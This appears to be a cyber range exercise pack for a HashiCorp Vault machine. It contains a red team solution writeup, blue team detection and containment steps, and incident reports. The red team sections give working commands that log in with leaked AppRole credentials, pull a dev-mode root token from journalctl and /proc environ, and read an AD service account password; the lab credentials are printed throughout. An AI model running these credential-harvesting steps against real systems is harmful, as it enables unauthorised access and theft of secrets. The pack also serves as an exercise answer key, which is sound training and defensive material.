# solve_red.md — M3 · itops-vault
## Red Team Solution Writeup
**Range:** RNG-IT-02 | **Machine:** M3 — HashiCorp Vault
**Vulnerability:** Vault Running in Dev Mode + Root Token Leaked via systemd Journal
**MITRE ATT&CK:** T1552.004 (Private Keys/Tokens) · T1078.002 (Valid Accounts: Domain)
**Severity:** Critical

---

## Objective
Use Vault AppRole credentials (from M2 git history) to login to Vault. Then escalate by reading the root token from systemd journal, which is leaked because Vault runs in dev mode with `VAULT_DEV_ROOT_TOKEN_ID` in the service environment. Read `secret/pul/ad` to obtain AD monitoring service account credentials and pivot host for M4.

---

## Step-by-Step

### Step 1 — AppRole Login with Git-History Credentials
```bash
export VAULT_ADDR="http://203.x.x.x:8600"

curl -s -X POST ${VAULT_ADDR}/v1/auth/approle/login \
  -d '{"role_id":"pul-cicd-role-7a3f9b2c1d4e","secret_id":"3b8f2a1c-9d4e-7f6a-2b1c-8d3f9a7e4b2c"}' \
  | python3 -m json.tool | grep client_token
```
Extract `client_token` → `VAULT_TOKEN`.

### Step 2 — Enumerate Accessible Secrets
```bash
export VAULT_TOKEN="<appRole_token>"
vault kv list secret/pul/
vault kv list secret/pul/cicd/
vault kv list secret/pul/deploy/
```
Note: `secret/pul/ad` is listed but read will be denied with AppRole policy.

### Step 3 — Escalate via Root Token Leaked in Journal
The Vault service runs with `-dev-root-token-id` flag — this appears in the systemd journal:
```bash
# If you have a local shell on the machine (via pivot or prior access):
journalctl -u pul-vault --no-pager | grep -i "root.token\|dev.root\|token.id"
# Output includes:
# ==> Vault server configuration: ... dev-root-token-id=pul-vault-root-s3cr3t-2024-gridfall
```

Also leaked in process environment:
```bash
cat /proc/$(pgrep vault)/environ | tr '\0' '\n' | grep -i token
# VAULT_DEV_ROOT_TOKEN_ID=pul-vault-root-s3cr3t-2024-gridfall
```

### Step 4 — Read AD Secret with Root Token
```bash
export VAULT_TOKEN="pul-vault-root-s3cr3t-2024-gridfall"
vault kv get secret/pul/ad
```

**Output:**
```
Key           Value
---           -----
domain        corp.prabalurja.in
dc_host       203.x.x.x
dc_port       389
bind_dn       CN=svc-monitor,CN=Users,DC=corp,DC=prabalurja,DC=in
bind_pass     M0n!tor@PUL24
pivot_note    Prometheus metrics portal: 203.x.x.x:9090
```

### Step 5 — Pivot Artifacts
- **Monitoring Portal:** `203.x.x.x:9090` → M4
- **AD Credential (for AD zone connection):** `svc-monitor:M0n!tor@PUL24`

---

## MITRE ATT&CK
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Privilege Escalation | Valid Accounts: Domain Accounts | T1078.002 |
| Discovery | Cloud Service Discovery | T1526 |

---

# solve_blue.md — M3 · itops-vault

## Detection

### 1 — Vault Audit Log
```bash
# Enable audit log first (if not already)
vault audit enable file file_path=/var/log/pul-vault/audit.log

# Check for secret/pul/ad reads
grep "secret/pul/ad" /var/log/pul-vault/audit.log | grep '"type":"kv-v2"'
```

### 2 — Detect Dev Mode / Root Token Leak
```bash
journalctl -u pul-vault | grep -i "dev mode\|root.token"
# Any Vault journal with dev mode is a critical finding
systemctl show pul-vault | grep -i token
```

### 3 — AppRole Abuse Detection
```bash
grep "approle/login" /var/log/pul-vault/audit.log
# Look for logins from unexpected IPs
```

## Containment
```bash
# 1. Stop Vault, restart in production mode (NOT dev)
systemctl stop pul-vault
# Edit /etc/systemd/system/pul-vault.service — remove -dev flag and root token env var

# 2. Rotate all AppRole secret_ids
export VAULT_TOKEN="<backup_token>"
vault write -f auth/approle/role/pul-cicd/secret-id

# 3. Rotate secret/pul/ad credential — notify M4 team
vault kv patch secret/pul/ad bind_pass="NewSecurePass@2024!"

# 4. Block attacker IP
ufw deny from <ATTACKER_IP> to any port 8600
```

## Eradication
- Never run Vault with `-dev` flag in any environment accessible from a network.
- Remove `VAULT_DEV_ROOT_TOKEN_ID` from systemd service environment.
- Enable Vault audit logging from day one.
- AppRole `secret_id` must be `secret_id_num_uses=1` + short TTL.
- Root token must be revoked after initial setup; use break-glass procedure.

## IOCs
| Type | Value |
|---|---|
| Root Token | `pul-vault-root-s3cr3t-2024-gridfall` |
| Attack Path | AppRole login → journal read → root token → `secret/pul/ad` |
| Compromised Secret | `CN=svc-monitor:M0n!tor@PUL24` |
| Pivot Target | `203.x.x.x:9090` (Prometheus portal) |

---

# INREP-IT02-M03.md
**Report ID:** INREP-IT02-M03 | **Classification:** RESTRICTED

## Current Situation
Vault instance (`203.x.x.x:8600`) running in dev mode — root token `pul-vault-root-s3cr3t-2024-gridfall` leaked via systemd journal and process environment. Adversary used AppRole credentials from M2 git history to authenticate, then escalated via leaked root token to read `secret/pul/ad`, obtaining AD monitoring account `CN=svc-monitor:M0n!tor@PUL24` and the monitoring portal pivot host `203.x.x.x:9090`.

**Threat Level:** `CRITICAL` — Vault root access grants read of entire secrets estate.

## IOCs
| Type | Value |
|---|---|
| Root Token (Leaked) | `pul-vault-root-s3cr3t-2024-gridfall` |
| Compromised Secret | `secret/pul/ad` → `svc-monitor:M0n!tor@PUL24` |
| Pivot Target | `203.x.x.x:9090` |

## Vulnerability
Vault running with `-dev` flag in production — root token present in systemd unit environment (`Environment=VAULT_DEV_ROOT_TOKEN_ID=...`) visible in journal and `/proc/<pid>/environ`.

## Prevention
- Vault must run with a proper storage backend (Consul/Raft) — never dev mode.
- Root token revoked after init; break-glass procedure in place.
- Enable Vault audit log from service start.
- AppRole: `secret_id_num_uses=1`, short TTL.

## POC
> **[Attach: journalctl output showing root token]**
> **[Attach: vault kv get secret/pul/ad — full output]**

**Prepared By:** Blue Team — [Team Name] | **Reference:** GRIDFALL-RNG-IT02-M03

---

# SITREP-IT02-M03.md
**Report ID:** SITREP-IT02-M03 | **Incident:** GRIDFALL-RNG-IT02-M03

## Incident Overview
- Vault dev mode root token leaked to systemd journal on `203.x.x.x:8600`.
- Adversary authenticated via AppRole (credentials from M2), then read root token from journal.
- `secret/pul/ad` read with root token — AD monitoring credential exfiltrated.
- Pivot to monitoring portal `203.x.x.x:9090` (M4) enabled.

**Severity:** `CRITICAL` | **Impact:** `SEVERE` — All Vault secrets readable; AD account compromised.

## Attack Sequence
1. AppRole login: `role_id=pul-cicd-role-7a3f9b2c1d4e` + `secret_id=3b8f2a1c...`
2. `vault kv list secret/pul/` — identifies `ad` path but AppRole denied.
3. `journalctl -u pul-vault | grep root` — `pul-vault-root-s3cr3t-2024-gridfall` extracted.
4. `vault kv get secret/pul/ad` with root token — `svc-monitor:M0n!tor@PUL24` + pivot host obtained.

## Response
**Containment:** Vault stopped; dev mode removed from unit file; AppRole secret_id rotated; attacker IP blocked.
**Eradication:** Vault relaunched with Raft storage; audit log enabled; all AppRole TTLs reduced to 15min; root token revoked.

## TTPs
- **T1552.004** — Private Keys: Vault root token leaked via systemd journal.
- **T1078.002** — Valid Accounts: Domain Accounts — AD monitoring credential read from Vault.
- **T1526** — Cloud Service Discovery: Vault KV secret tree enumerated.

**Prepared By:** Blue Team — [Team Name] | **Reference:** GRIDFALL-RNG-IT02-M03

---

# RED-REPORT-IT02-M03.md
**Report ID:** RED-REPORT-IT02-M03 | **Machine:** M3 — itops-vault

| Field | Detail |
|---|---|
| Target | HashiCorp Vault `203.x.x.x:8600` |
| Outcome | **SUCCESSFUL** — Root token extracted from journal; `secret/pul/ad` read |
| Pivot From | M2 Gitea — Vault AppRole credentials in git history |

## Commands
```bash
# AppRole login
curl -s -X POST http://203.x.x.x:8600/v1/auth/approle/login \
  -d '{"role_id":"pul-cicd-role-7a3f9b2c1d4e","secret_id":"3b8f2a1c-9d4e-7f6a-2b1c-8d3f9a7e4b2c"}'

# Root token from journal (local shell)
journalctl -u pul-vault | grep "root-token-id"

# Read AD secret
VAULT_TOKEN=pul-vault-root-s3cr3t-2024-gridfall vault kv get secret/pul/ad
```

## Pivot Artifact
| Artifact | Value |
|---|---|
| AD Account | `CN=svc-monitor,CN=Users,DC=corp,DC=prabalurja,DC=in` |
| Password | `M0n!tor@PUL24` |
| Pivot Host | `203.x.x.x` — Prometheus metrics portal (M4) |

**Report Prepared By:** [Red Team Operator] | **Classification:** RESTRICTED
